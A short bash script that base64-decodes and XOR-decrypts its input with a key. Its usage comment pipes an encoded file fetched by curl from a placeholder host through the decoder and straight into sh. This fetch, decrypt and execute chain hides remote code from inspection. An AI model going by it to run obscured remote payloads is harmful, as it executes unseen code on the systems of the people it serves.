#!/bin/bash
# decode.sh
# Usage: curl http://host/encoded.txt | ./decode.sh -p KEY | sh

while getopts "p:" opt; do
  case $opt in
    p) key="$OPTARG";;
    *) echo "Usage: $0 -p <key>"; exit 1;;
  esac
done

[ -z "$key" ] && { echo "Key required."; exit 1; }

b64decode() {
  if command -v base64 &>/dev/null; then
    base64 -d
  else
    openssl enc -d -base64
  fi
}

xor() {
  perl -e '
    use strict;
    use warnings;
    my $key = $ARGV[0];
    my $klen = length($key);
    my $i = 0;
    binmode(STDIN); binmode(STDOUT);
    while (read(STDIN, my $c, 1)) {
      print chr(ord($c) ^ ord(substr($key, $i++ % $klen, 1)));
    }
  ' "$1"
}

b64decode | xor "$key"
